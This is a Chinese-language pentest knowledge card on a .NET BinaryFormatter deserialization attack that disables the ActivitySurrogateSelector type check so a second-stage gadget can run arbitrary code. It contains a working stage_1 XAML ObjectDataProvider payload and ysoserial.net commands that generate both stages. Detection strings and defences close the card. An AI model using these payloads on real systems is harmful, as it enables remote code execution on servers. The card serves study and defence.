---
id: web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass
title: ActivitySurrogateSelector 类型检查绕过：ObjectDataProvider 反序列化先改 AppSettings.DisableActivitySurrogateSelectorTypeCheck
type: scenario
domain: web
path: web/dotnet/deserialization
technique: activitysurrogateselector-disable-typecheck-objectdataprovider
aliases:
- DisableActivitySurrogateSelectorTypeCheck
- ActivitySurrogateSelector 绕过
- ObjectDataProvider 任意方法调用
- AppSettings 开关绕过
- .NET 4.8 ActivitySurrogateSelector
tags:
- dotnet
- deserialization
- binaryformatter
- activitysurrogateselector
- objectdataprovider
- wpf
- gadget
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V519
  verified_at: '2026-11-11T13:04:56+08:00'
  notes: 已对照原文与25张截图核对：img09/10 为解密出的 stage_1 明文，逐字段确认卡2 的 PoC——ResourceDictionary 内 ObjectDataProvider 链 GetType(System.Workflow.ComponentModel.AppSettings, Version=4.0.0.0, PublicKeyToken=31bf3856ad364e35)→GetField(disableActivitySurrogateSelectorTypeCheck, BindingFlags 40)→SetValue(true)，以及 ConfigurationManager.AppSettings.Set('microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck','true')；明文头部为 Microsoft.PowerShell.Editor 与 Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties，即该 XAML 由 TextFormattingRunProperties gadget 承载，已补入卡中。已修正字段名大小写（实际字段为小写 disableActivitySurrogateSelectorTypeCheck，AppSettings 键为大写），并把 ysoserial 示例命令改为单一 -o base64（原命令含重复 -o 与无效 -osz）。原文 img10 支持 stage_1 关闭 ActivitySurrogateSelector 类型检查，img02 支持两段式。dedup 无 duplicate；与 web-dotnet-deser-viewstate-machinekey-textformattingrunproperties（ViewState 机器密钥入口）不同链。原文无版本标记，仅说『高版本框架』，affected_versions 留空。
---

## 一句话结论

`ActivitySurrogateSelector` 是 .NET `BinaryFormatter` 的强利用 gadget，但较高版本的 .NET Framework 默认通过 `ActivitySurrogateSelectorTypeCheck` 开关禁用该类型；攻击者可先投递一段 `ObjectDataProvider`/`ResourceDictionary` 形式的反序列化辅助载荷（实际由 `TextFormattingRunProperties` gadget 的 BinaryFormatter 流承载），借反序列化过程中的任意方法调用把 `System.Workflow.ComponentModel.AppSettings` 的 `disableActivitySurrogateSelectorTypeCheck` 字段置为 `true`，并把配置键 `microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck` 设为 `true`，随后再反序列化 `ActivitySurrogateSelector` payload 即可正常执行任意 .NET 代码。

## 原理

- **ActivitySurrogateSelector 是什么**：`System.Workflow.ComponentModel` 中的 `ActivitySurrogateSelector` 可在 `BinaryFormatter` 反序列化时对类型做「代理/替换」，被 ysoserial.net 等工具用作加载并执行任意 .NET 程序集的 gadget。它的威力来自可把受控对象解释成任意类型工作流活动，从而调用任意方法。
- **为什么高版本会被拦**：微软在 .NET Framework（4.8 等）中增加 `ActivitySurrogateSelectorTypeCheck` 检查，`BinaryFormatter` 反序列化 `ActivitySurrogateSelector` 相关类型时会拒绝/抛异常，除非显式关闭该检查。
- **关闭开关的接口**：`System.Workflow.ComponentModel.AppSettings` 中有一个 `disableActivitySurrogateSelectorTypeCheck` 字段（首字母小写，通过反射可读写）；同时把配置系统里的 `microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck`（`ConfigurationManager.AppSettings`）设为 `true` 也会关闭检查。
- **ObjectDataProvider 是任意方法调用载体**：WPF 的 `ObjectDataProvider` 支持在 XAML/序列化对象中声明 `ObjectType`/`MethodName`/`MethodParameters`，反序列化后对其求值即完成「对指定类型调用指定方法」。把 `ObjectDataProvider` 放进 `ResourceDictionary` 的 `ResourceDictionary.MergedDictionaries`/资源引用链中，可在 `BinaryFormatter` 反序列化时依次触发（截图中 stage_1 明文的 `TextFormattingRunProperties` 流内即为此 XAML）：
  1. `MethodName=GetType`，参数为 `System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel` → 取得类型；
  2. `MethodName=GetField`（`BindingFlags=40`，即 NonPublic|Static）参数 `disableActivitySurrogateSelectorTypeCheck` → 取得字段；
  3. `MethodName=SetValue` → 设该字段为 `true`；
  4. `MethodName=Set`，`ObjectInstance={x:Static System.Configuration.ConfigurationManager.AppSettings}`，参数 `microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck` + `true`。
- **两段式 payload**：第一段（stage_1）只做开关关闭，体量小、兼容不同 .NET 版本；第二段（stage_2/3）才携带 `ActivitySurrogateSelector` + 恶意程序集/shellcode。投递脚本先反序列化 stage_1，成功后再走 stage_2；失败则回退另一版本载荷。
- **为什么必须先关开关**：`ActivitySurrogateSelector` 的类型检查发生在反序列化该 gadget 的瞬间，只有当前进程的 `AppSettings` 开关已为 `true` 时才会放行；这与「先执行一段辅助 gadget、再执行主 gadget」的两段式利用思路一致。

## 触发条件

- 存在 `BinaryFormatter.Deserialize` 等 .NET 原生反序列化入口（Web 参数、ViewState、文件解析、脚本宿主等）。
- 目标为受类型检查影响的 .NET Framework 版本（4.8 等），且 `System.Workflow.ComponentModel`、WPF `PresentationFramework` 程序集可用（.NET Framework 默认安装）。
- 攻击者可投递两段序列化数据，并按目标框架版本选择载荷。
- 未启用 .NET 的 `BinaryFormatter` 全局禁用开关（AppContext 开关）或其它序列化白名单拦截。

## 利用步骤

1. 确认入口执行 `BinaryFormatter.Deserialize`，并探明 .NET 版本（错误信息、注册表、页面特征等）。
2. 生成 stage_1：一个 `ObjectDataProvider`/`ResourceDictionary` 形式的辅助反序列化载荷，用反射把 `AppSettings.disableActivitySurrogateSelectorTypeCheck` 置 `true`；可用 ysoserial.net 的 `ActivitySurrogateDisableTypeCheck` gadget（`-g ActivitySurrogateDisableTypeCheck -f BinaryFormatter`）生成。
3. 生成 stage_2：`ActivitySurrogateSelector` gadget 携带恶意程序集（`-g ActivitySurrogateSelector -f BinaryFormatter -c "<command>"`）。
4. 先投递 stage_1 并确认无异常（开关已关闭），再投递 stage_2；若入口只允许一次反序列化，可把两步封装进同一载荷的嵌套结构或选择兼容版本的 payload。
5. 成功后验证命令执行/程序集加载（进程创建、回连等）。

## PoC

```xml
<!-- stage_1 核心结构（简化）：ResourceDictionary + ObjectDataProvider 反序列化时关闭类型检查 -->
<ResourceDictionary
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:s="clr-namespace:System;assembly=mscorlib"
    xmlns:c="clr-namespace:System.Configuration;assembly=System.Configuration"
    xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib">

  <ObjectDataProvider x:Key="type" ObjectType="{x:Type s:Type}" MethodName="GetType">
    <ObjectDataProvider.MethodParameters>
      <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <ObjectDataProvider x:Key="field" ObjectInstance="{StaticResource type}" MethodName="GetField">
    <ObjectDataProvider.MethodParameters>
      <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
      <r:BindingFlags>40</r:BindingFlags>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <ObjectDataProvider x:Key="set" ObjectInstance="{StaticResource field}" MethodName="SetValue">
    <ObjectDataProvider.MethodParameters>
      <s:Object/>
      <s:Boolean>true</s:Boolean>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <ObjectDataProvider x:Key="setMethod" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName="Set">
    <ObjectDataProvider.MethodParameters>
      <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
      <s:String>true</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
</ResourceDictionary>
```

```bash
# 生成辅助载荷与主载荷（ysoserial.net 示例）
ysoserial.exe -g ActivitySurrogateDisableTypeCheck -f BinaryFormatter -o base64
ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c "calc" -o base64
```

（本卡只描述机制，不提供针对具体目标的完整利用载荷。）

## 变体与关联

- **同类「先关检查」思路**：`TypeConfuseDelegate`、`TextFormattingRunProperties`（见 [[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]）等 gadget 在不同补丁级别下可能受限；`ObjectDataProvider` 本身也能用于关闭其它开关或执行辅助反射调用。
- **入口变体**：任何 `BinaryFormatter` 入口都可承载，包括 ViewState（MachineKey 泄露场景）、ERP/文件解析、脚本宿主（CHM 内 JScript，见 [[pentest-initial-access-chm-html-js-dotnet-binaryformatter-staged-payload]]）。
- **工程化变体**：两段式载荷可按目标 .NET 版本准备多份（stage_1/2/3），在投递脚本中按异常回退，提高兼容性。

## 检测与防御

- **检测**：`BinaryFormatter` 反序列化数据中出现 `ResourceDictionary`、`ObjectDataProvider`、`System.Workflow.ComponentModel.AppSettings`、`DisableActivitySurrogateSelectorTypeCheck`、`ConfigurationManager` 等字符串；进程内反射调用 `GetField`/`SetValue` 修改 `AppSettings`；反序列化后加载动态程序集或派生进程。
- **防御**：禁用 `BinaryFormatter`（.NET 5+ 默认禁用，旧版本通过 AppContext 开关 `Switch.System.Runtime.Serialization.SerializationGuard.BinaryFormatter` 或白名单）；升级 .NET Framework 并保持 `ActivitySurrogateSelectorTypeCheck` 开启；对反序列化入口做类型白名单；代码审计禁止对不可信输入调用 `BinaryFormatter.Deserialize`。
